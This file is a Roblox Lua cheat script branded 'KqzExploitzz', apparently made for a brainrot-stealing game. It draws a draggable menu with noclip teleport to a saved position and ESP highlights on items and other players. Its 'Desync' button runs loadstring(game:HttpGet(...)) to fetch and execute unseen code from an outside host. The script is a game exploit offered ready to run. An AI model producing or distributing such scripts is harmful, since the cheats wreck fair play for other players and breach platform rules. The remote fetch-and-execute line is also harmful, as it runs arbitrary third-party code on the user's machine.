local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local GuiService = game:GetService("GuiService")
local RunService = game:GetService("RunService")

local Player = Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
local Humanoid = Character:WaitForChild("Humanoid")

-- Cleanup duplicate UI
if CoreGui:FindFirstChild("BrainrotScriptUI") then
    CoreGui.BrainrotScriptUI:Destroy()
end

-- Update character references on respawn
Player.CharacterAdded:Connect(function(char)
    Character = char
    HumanoidRootPart = char:WaitForChild("HumanoidRootPart")
    Humanoid = char:WaitForChild("Humanoid")
end)

local SavedPosition = nil

-- UI Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "BrainrotScriptUI"
ScreenGui.Parent = CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.BorderSizePixel = 1
MainFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.Position = UDim2.new(0.5, -110, 0.5, -130)
MainFrame.Size = UDim2.new(0, 220, 0, 320)
MainFrame.Active = true

-- Mobile Toggle Button
local MobileToggle = Instance.new("TextButton")
MobileToggle.Name = "MobileToggle"
MobileToggle.Parent = ScreenGui
MobileToggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MobileToggle.Size = UDim2.new(0, 50, 0, 50)
MobileToggle.Position = UDim2.new(0, 10, 0.5, -25)
MobileToggle.Text = "Menu"
MobileToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
MobileToggle.Font = Enum.Font.GothamBold
MobileToggle.Visible = UserInputService.TouchEnabled

local ToggleCorner = Instance.new("UICorner")
ToggleCorner.CornerRadius = UDim.new(0, 25)
ToggleCorner.Parent = MobileToggle

MobileToggle.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
end)

-- Modern Drag Logic
local dragging, dragInput, dragStart, startPos
MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Parent = MainFrame
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Font = Enum.Font.GothamBold
Title.Text = "💰KqzExploitzz"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 18

local ButtonList = Instance.new("ScrollingFrame")
ButtonList.Name = "ButtonList"
ButtonList.Parent = MainFrame
ButtonList.BackgroundTransparency = 1
ButtonList.BorderSizePixel = 0
ButtonList.Position = UDim2.new(0, 10, 0, 50)
ButtonList.Size = UDim2.new(1, -20, 1, -60)
ButtonList.ScrollBarThickness = 2
ButtonList.CanvasSize = UDim2.new(0, 0, 0, 0)
ButtonList.AutomaticCanvasSize = Enum.AutomaticSize.Y

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = ButtonList
UIListLayout.Padding = UDim.new(0, 10)
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

local function CreateButton(text, color)
    local Button = Instance.new("TextButton")
    Button.Size = UDim2.new(1, 0, 0, 40)
    Button.BackgroundColor3 = color or Color3.fromRGB(0, 0, 0)
    Button.Font = Enum.Font.GothamSemibold
    Button.Text = text
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.TextSize = 14
    Button.AutoButtonColor = true
    
    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 6)
    Corner.Parent = Button
    
    local Stroke = Instance.new("UIStroke")
    Stroke.Color = Color3.fromRGB(255, 255, 255)
    Stroke.Thickness = 1
    Stroke.Parent = Button
    
    Button.Parent = ButtonList
    return Button
end

-- 0. Respawn Desync - EXTERNAL MODULE INTEGRATION
local DesyncBtn = CreateButton("Desync", Color3.fromRGB(80, 40, 40))
DesyncBtn.MouseButton1Click:Connect(function()
    DesyncBtn.Text = "Desyncing... 👻"
    pcall(function()
        loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/6259444f60f0e2ae06855fcb0d84eaaa6d51167d23dae82e2f07cc58b8ce6fa1/download"))()
    end)
    task.wait(1)
    DesyncBtn.Text = "Desync"
end)

-- 1. Save Position
local SaveBtn = CreateButton("Save", Color3.fromRGB(40, 40, 40))
SaveBtn.MouseButton1Click:Connect(function()
    if Character and HumanoidRootPart then
        SavedPosition = HumanoidRootPart.CFrame
        SaveBtn.Text = "Saved! ✅"
        task.wait(1)
        SaveBtn.Text = "Save"
    end
end)

-- 2. Teleport To Saved (Instant TP💨)
local TPBtn = CreateButton("Instant TP💨", Color3.fromRGB(60, 60, 60))
TPBtn.MouseButton1Click:Connect(function()
    if not SavedPosition then return end
    if Character and HumanoidRootPart and Humanoid then
        local carpet = Character:FindFirstChild("Flying Carpet") or Player.Backpack:FindFirstChild("Flying Carpet")
        
        if carpet and carpet.Parent == Player.Backpack then
            carpet.Parent = Character
        end

        local noclipConnection
        noclipConnection = RunService.Stepped:Connect(function()
            if Character then
                for _, part in pairs(Character:GetDescendants()) do
                    if part:IsA("BasePart") then part.CanCollide = false end
                end
            end
        end)

        Humanoid.PlatformStand = true
        
        for i = 1, 35 do
            if HumanoidRootPart then
                HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
                HumanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)
                HumanoidRootPart.CFrame = SavedPosition
            end
            RunService.Heartbeat:Wait()
        end
        
        if noclipConnection then noclipConnection:Disconnect() end
        if Character then
            for _, part in pairs(Character:GetDescendants()) do
                if part:IsA("BasePart") then part.CanCollide = true end
            end
        end
        
        Humanoid.PlatformStand = false
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
        HumanoidRootPart.Velocity = Vector3.new(0,0,0)
        
        TPBtn.Text = "TP Successful! 💨"
        task.wait(1)
        TPBtn.Text = "Instant TP💨"
    end
end)

-- ESP States
local brainrotESPActive = false
local playerESPActive = false

-- Optimized ESP Tracking
local BrainrotHighlights = {}
local PlayerHighlights = {}

local function applyBrainrotESP(obj)
    if not brainrotESPActive then return end
    local name = obj.Name:lower()
    if obj:IsA("BasePart") and (name:find("brain") or name:find("rot") or name:find("steal") or name:find("item") or name:find("collect")) then
        local target = obj.Parent:IsA("Model") and obj.Parent or obj
        if not target:FindFirstChild("BrainrotESP") then
            local highlight = Instance.new("Highlight")
            highlight.Name = "BrainrotESP"
            highlight.FillColor = Color3.fromRGB(255, 255, 255)
            highlight.OutlineColor = Color3.fromRGB(0, 0, 0)
            highlight.Parent = target
            table.insert(BrainrotHighlights, highlight)
        end
    end
end

local function applyPlayerESP(pChar)
    if not playerESPActive or not pChar then return end
    if not pChar:FindFirstChild("PlayerESP") then
        local highlight = Instance.new("Highlight")
        highlight.Name = "PlayerESP"
        highlight.FillColor = Color3.fromRGB(200, 200, 200)
        highlight.Adornee = pChar
        highlight.Parent = pChar
        table.insert(PlayerHighlights, highlight)
    end
end

-- Listeners
workspace.DescendantAdded:Connect(function(obj)
    task.wait(0.1)
    applyBrainrotESP(obj)
end)

Players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(function(char)
        task.wait(0.5)
        applyPlayerESP(char)
    end)
end)

for _, p in pairs(Players:GetPlayers()) do
    if p ~= Player then
        p.CharacterAdded:Connect(function(char)
            task.wait(0.5)
            applyPlayerESP(char)
        end)
    end
end

-- 3. Esp Best
local ESPBrainrotBtn = CreateButton("Esp Best", Color3.fromRGB(40, 40, 40))
ESPBrainrotBtn.MouseButton1Click:Connect(function()
    brainrotESPActive = not brainrotESPActive
    ESPBrainrotBtn.BackgroundColor3 = brainrotESPActive and Color3.fromRGB(100, 100, 100) or Color3.fromRGB(40, 40, 40)
    if brainrotESPActive then
        for _, obj in pairs(workspace:GetDescendants()) do applyBrainrotESP(obj) end
    else
        for _, h in pairs(BrainrotHighlights) do if h and h.Parent then h:Destroy() end end
        BrainrotHighlights = {}
    end
end)

-- 4. ESP Player
local ESPPlayerBtn = CreateButton("ESP Player", Color3.fromRGB(40, 40, 40))
ESPPlayerBtn.MouseButton1Click:Connect(function()
    playerESPActive = not playerESPActive
    ESPPlayerBtn.BackgroundColor3 = playerESPActive and Color3.fromRGB(100, 100, 100) or Color3.fromRGB(40, 40, 40)
    if playerESPActive then
        for _, p in pairs(Players:GetPlayers()) do if p ~= Player and p.Character then applyPlayerESP(p.Character) end end
    else
        for _, h in pairs(PlayerHighlights) do if h and h.Parent then h:Destroy() end end
        PlayerHighlights = {}
    end
end)

-- Toggle UI
UserInputService.InputBegan:Connect(function(input, gpe)
    if not gpe then
        if input.KeyCode == Enum.KeyCode.K or input.KeyCode == Enum.KeyCode.ButtonSelect then
            MainFrame.Visible = not MainFrame.Visible
        end
    end
end)